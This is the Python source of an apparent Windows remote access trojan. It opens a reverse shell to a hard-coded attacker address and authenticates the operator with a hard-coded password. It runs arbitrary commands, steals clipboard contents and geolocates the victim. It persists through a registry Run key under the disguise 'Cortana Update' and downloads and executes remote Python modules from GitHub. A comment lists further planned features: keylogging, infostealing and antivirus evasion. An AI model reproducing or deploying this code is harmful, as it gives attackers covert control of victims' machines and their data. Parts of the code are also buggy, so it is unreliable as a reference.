import shutil
import subprocess
import socket
import os
import sys
import requests
import tempfile
import colorama
try:
    import win32con
    import winreg
    from win32api import GetUserNameEx, NameSamCompatible
    from win32clipboard import *
except:
    pass
from time import sleep
# persistence, backdooring, download/upload, modularity, screenshot, webcam, keylogger, webhistory, clear tracks, authentication, remote access, fancy prompt, vm/av detection, obfuscation/encryption, infostealer, over WAN, clipboard hijacking

color = colorama.init()
red = colorama.Fore.RED
green = colorama.Fore.GREEN

HOST = "192.168.1.60"
PORT = 4444
USER = "admin"
PASS = "pass123"
modules = {"screenshot": "scrshot.py"}
commands = ["terminate:", "geoLocate", "cd", "setPersistence", "push_module", "exec_module", "getClipData"]


def connect(ip, port: int):
    connection_status = False
    try:
        global connection
        connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connection.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        connection.connect((ip, port))
        connection_status = True
    except:
        pass
    return connection_status


def SetPersistence():
    try:
        handle = winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER)
        # file_path = __file__.capitalize()
        key = "Cortana Update"
        sub_key = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
        folder = "\\Cortana"
        filename = "Update.exe"
        path = os.environ.get('APPDATA') + folder
        persistStatus = False

        if not os.path.exists(path):
            os.mkdir(path)
            finalpath = path + "\\" + filename
            shutil.copyfile(sys.executable, finalpath)

        if handle:
            hkey = winreg.OpenKey(handle, sub_key, 0, winreg.KEY_ALL_ACCESS)
            # print("Opened !!")
            if hkey:
                try:
                    key_value = winreg.QueryValueEx(hkey, key)
                    # print("Entry Exists")
                    # print(key_value)
                    persistStatus = True
                except Exception as e:
                    winreg.SetValueEx(hkey, key, 0, winreg.REG_SZ, "\""+finalpath+"\"")
                    winreg.CloseKey(hkey)
                    # print("Entry Added")
                    persistStatus = True

    except Exception as e:
        # print(e)
        winreg.CloseKey(hkey)
    return persistStatus


def geoLocate():
    try:
        url = "http://ipinfo.io/"
        status = requests.get(url).content
        return (status)
    except:
        return red+"cannot fetch details !!\n".encode()

def ClipboardData():
    try:
        OpenClipboard()
        data = GetClipboardData(win32con.CF_TEXT)  # get clipboard data
        CloseClipboard()
        return data+'\n'.encode()
    except TypeError:
        pass

def fetch_modules(ModuleName):
    # global modules
    print("module requested = ", ModuleName)
    # print("inside mod func")
    moduleLocation = "https://raw.githubusercontent.com/Casanova5065/modules/main/"
    if ModuleName in modules:
        modulePath = moduleLocation + modules[ModuleName]
        print("fetching from ",modulePath)
        fetchModule = requests.get(modulePath).text
        # print(fetchModule)
    print("Outside if")
    localPath = tempfile.gettempdir() + "\\Modules"
    print(localPath)
    if not os.path.exists(localPath):
        os.mkdir(localPath)
    # else:
    print("writing module at", localPath+f'\\{modules[ModuleName]}')
    with open(localPath+f'\\{modules[ModuleName]}', "w") as moduleFile:
        moduleFile.write(fetchModule)

# error in this function


def executeModule(module):
    modulePath = tempfile.gettempdir() + "\\Modules\\" + modules[module]
    print(modulePath)
    if os.path.exists(modulePath):
        print("Executing module : ", f"python {modulePath}")
        subprocess.Popen(f"python {modulePath}")

def shell():
    while True:
        cwd = red + f" ({GetUserNameEx(NameSamCompatible)}) " + \
            green + os.getcwd() + " >"
        connection.send(cwd.encode())
        command = connection.recv(1024).decode().strip("\n")

        if command == commands[0]:
            connection.close()
            exit(0)

        elif command[:2] == commands[2]:
            os.chdir(command[3:])

        # get machine's details such as public IP, coordinates etc.
        elif command == commands[1]:
            ipdetails = geoLocate()
            connection.send(ipdetails)

        elif command == commands[3]:
            sleep(10)
            status = SetPersistence()
            if status: msg = green + "[+] Persistence enabled !!\n" 
            else: msg = red + "[-] Failed to persist, please try manually !!\n"
            connection.send(msg.encode())

        elif command == commands[6]:
            clipData = ClipboardData()
            try:connection.send(clipData)
            except:connection.send((red+"[!] Nothing on clipboard or invalid data.\n").encode())

        elif commands[4] in command:  # download additional modules.
            # print("inside", command[12:])
            # fetch_modules(command[12:])
            fetch_modules(command.split(" ")[1])

        elif commands[5] in command:  # execute the modules.
            # print("Executing module ", command[12:])
            # executeModule(command[12:])
            executeModule(command.split(" ")[1])

        else:  # execute shell commands.
            STDOUT = STDERR = subprocess.PIPE
            proc = subprocess.Popen(command, shell=True, stdout=STDOUT, stderr=STDERR)
            output = proc.stdout.read() + proc.stderr.read()
            connection.send(output)


if __name__ == '__main__':
    status = connect(HOST, PORT)
    if status:  # allow 3 authentication attempts.
        loginAttempts = 0
        while loginAttempts < 3:
            connection.send("USER : ".encode())
            username = connection.recv(1024).decode().strip('\n')
            connection.send("PASS : ".encode())
            password = connection.recv(1024).decode().strip('\n')
            if username == USER and password == PASS:
                shell()
            connection.send((red+"\nAccess Denied !!\n\n").encode())
            loginAttempts += 1
            